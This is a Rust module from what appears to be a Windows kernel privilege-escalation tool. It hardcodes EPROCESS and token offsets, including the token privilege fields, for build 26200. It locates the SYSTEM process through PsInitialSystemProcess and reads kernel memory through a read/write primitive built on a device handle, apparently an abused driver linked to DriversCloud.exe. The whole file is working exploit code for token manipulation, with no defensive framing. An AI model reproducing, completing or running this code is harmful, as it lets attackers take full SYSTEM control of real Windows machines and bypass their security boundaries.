use std::sync::OnceLock;

use anyhow::{bail, Context, Result};

use crate::device::Device;
use crate::kernel_rw::KernelRW;
use crate::utils::{find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path};

/// EPROCESS / _TOKEN field offsets for a specific Windows kernel build.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct EprocOffsets {
    pub unique_pid: u64,
    pub active_links: u64,
    pub token: u64,
    pub image_filename: u64,
    pub sep_present: u64,
    pub sep_enabled: u64,
}

impl EprocOffsets {
    pub const BUILD_26200: Self = Self {
        unique_pid: 0x1D0,
        active_links: 0x1D8,
        token: 0x248,
        image_filename: 0x338,
        sep_present: 0x40,
        sep_enabled: 0x48,
    };
}

/// Known builds (NtBuildNumber low 16 bits). Add entries from `discover` output.
const BUILD_OFFSETS: &[(u16, EprocOffsets)] = &[
    (26200, EprocOffsets::BUILD_26200),
];

static ACTIVE_OFFSETS: OnceLock<EprocOffsets> = OnceLock::new();

// Default constants for DriversCloud.exe (build 26200). mmdevlib uses the table instead.
pub const EPROC_UNIQUE_PID: u64 = EprocOffsets::BUILD_26200.unique_pid;
pub const EPROC_ACTIVE_LINKS: u64 = EprocOffsets::BUILD_26200.active_links;
pub const EPROC_TOKEN: u64 = EprocOffsets::BUILD_26200.token;
pub const EPROC_IMAGE_FILENAME: u64 = EprocOffsets::BUILD_26200.image_filename;
pub const TOKEN_SEP_PRESENT: u64 = EprocOffsets::BUILD_26200.sep_present;
pub const TOKEN_SEP_ENABLED: u64 = EprocOffsets::BUILD_26200.sep_enabled;

#[repr(C)]
struct RtlOsVersionInfoW {
    dw_os_version_info_size: u32,
    dw_major_version: u32,
    dw_minor_version: u32,
    dw_build_number: u32,
    dw_platform_id: u32,
    sz_csd_version: [u16; 128],
}

#[link(name = "ntdll")]
unsafe extern "system" {
    fn RtlGetVersion(lp_version_information: *mut RtlOsVersionInfoW) -> i32;
}

/// User-mode NtBuildNumber (same low 16 bits as kernel `discover` reports).
pub fn query_nt_build_number() -> Result<u16> {
    let mut info = RtlOsVersionInfoW {
        dw_os_version_info_size: std::mem::size_of::<RtlOsVersionInfoW>() as u32,
        dw_major_version: 0,
        dw_minor_version: 0,
        dw_build_number: 0,
        dw_platform_id: 0,
        sz_csd_version: [0; 128],
    };
    let st = unsafe { RtlGetVersion(&mut info) };
    if st < 0 {
        bail!("RtlGetVersion failed: 0x{:08X}", st as u32);
    }
    Ok(info.dw_build_number as u16)
}

pub fn offsets_for_build(build: u16) -> Result<&'static EprocOffsets> {
    BUILD_OFFSETS
        .iter()
        .find(|(b, _)| *b == build)
        .map(|(_, off)| off)
        .with_context(|| {
            format!(
                "unsupported NtBuildNumber {} (0x{:X}); run discover and add an entry to BUILD_OFFSETS",
                build, build
            )
        })
}

/// Resolve offsets for the current machine and cache them (mmdevlib entry point).
pub fn init_for_current_build() -> Result<&'static EprocOffsets> {
    if let Some(off) = ACTIVE_OFFSETS.get() {
        return Ok(off);
    }
    let build = query_nt_build_number()?;
    let offs = offsets_for_build(build)?;
    Ok(ACTIVE_OFFSETS.get_or_init(|| *offs))
}

pub fn active_offsets() -> Result<&'static EprocOffsets> {
    ACTIVE_OFFSETS
        .get()
        .ok_or_else(|| anyhow::anyhow!("EPROCESS offsets not initialized; call init_for_current_build first"))
}

pub fn read_image_filename(krw: &KernelRW, eproc: u64) -> Result<String> {
    read_image_filename_with(krw, eproc, &EprocOffsets::BUILD_26200)
}

pub fn read_image_filename_with(krw: &KernelRW, eproc: u64, off: &EprocOffsets) -> Result<String> {
    let lo = krw.kread(eproc + off.image_filename)?;
    let hi = krw.kread(eproc + off.image_filename + 8)?;
    let mut bytes = [0u8; 15];
    bytes[0..8].copy_from_slice(&lo.to_le_bytes());
    bytes[8..15].copy_from_slice(&hi.to_le_bytes()[0..7]);
    let nul = bytes.iter().position(|&b| b == 0).unwrap_or(15);
    Ok(String::from_utf8_lossy(&bytes[..nul]).to_string())
}

pub fn resolve_system_eprocess(dev: &Device) -> Result<(KernelRW<'_>, u64)> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    if eproc < 0xFFFF_8000_0000_0000 {
        bail!("PsInitialSystemProcess kread returned bad value 0x{:016X}", eproc);
    }
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok((krw, eproc))
}
